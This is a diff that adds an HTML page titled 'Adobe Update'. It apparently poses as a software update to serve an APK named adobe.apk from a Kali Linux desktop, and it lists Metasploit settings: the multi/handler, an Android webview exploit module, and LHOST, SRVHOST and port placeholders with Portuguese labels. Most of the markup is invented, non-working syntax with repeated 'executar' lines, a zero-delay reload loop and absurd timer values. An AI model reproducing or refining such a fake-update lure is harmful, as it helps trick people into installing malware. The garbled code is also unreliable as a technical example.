@@ -1,0 +1,79 @@
+<link><img class = "/home/kali/Desktop/adobe.apk" src = "/home/kali/Desktop/imagem.jpg">
+<open = html = (run/exploit/msf6+++)>
+<open = (URIPATH = /home/kali/Desktop/adobe.apk) </open>
+<html>
+  <head>
+    <title> Adobe Update </title>
+  </head>
+  <body>
+  <div cetmgr/c/root/user/android/run/exploit/msf6+++ [/.apk[/r URIPATH = /home/kali/Desktop/adobe.apk][/r/home/kali/Desktop/adobe.apk][run][exploit][msf6+++]>
+    <script>
+    window.setTimeout('location.reload(true);', 0);
+    </script>
+  <div src = 'exploit/multi/handler'
+          src = 'exploit/android/browser/webview_addjavascriptinterface'
+          src = "(LHOST = [SEU IP])"
+          src = "(RHOST = [PORTA])"
+          src = "(SRVHOST = [IP ALVO])"
+          src = "(SRVPORT = [PORTA ALVO])"
+          src = "(URIPATH = /home/kali/Desktop/adobe.apk)"
+          src = '(run)'
+          src = '(exploit)'
+          else
+          src = '(msf6+++)'
+          end else (3) 
+          </div>
+          <div
+          action = (run)
+          action = (exploit)
+          else
+          action = (msf6+++)
+          end else(1)
+</div>
+<div import time = (99999999999999999) </div>
+<script>
+open = ("msf6+++")/("exploit"/("run") = executar 
+</script>
+<script>
+open = ("URIPATH = /home/kali/Desktop/adobe.apk") = executar 
+</script>
+<import src = ("/home/kali/Desktop/adobe.apk") </import>
+<import src = ("executar") </import>
+<div import time = (99999999999999999) </div>
+<script>
+open = ("msf6+++")/("exploit"/("run") = executar 
+</script>
+<script>
+open = ("URIPATH = /home/kali/Desktop/adobe.apk") = executar 
+</script>
+<import src = ("/home/kali/Desktop/adobe.apk") </import>
+<import src = ("executar") </import>
+<div import time = (99999999999999999) </div>
+<script>
+open = ("msf6+++")/("exploit"/("run")) = executar 
+open = ("URIPATH = /home/kali/Desktop/adobe.apk") = executar
+</script>
+<import src = ("/home/kali/Desktop/adobe.apk") </import>
+<import src = ("executar") </import>
+<div import time = (99999999999999999) </div>
+<script>
+open = ("msf6+++")/("exploit"/("run") = executar 
+</script>
+<script>
+open = ("URIPATH = /home/kali/Desktop/adobe.apk") = executar 
+</script>
+<import src = ("/home/kali/Desktop/adobe.apk") </import>
+<import src = ("executar") </import>
+<div import time = (99999999999999999) </div>
+<script>
+open = ("msf6+++")/("exploit"/("run")/) = executar
+open = ("URIPATH = /home/kali/Desktop/adobe.apk") = executar
+</script>
+<import src = ("executar") <import>
+<script> 
+<import time = ("window.setTimeout") + (3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)>
+</script>
+<import src = ("executar") <import>
+</script>
+  </body>
+</html>
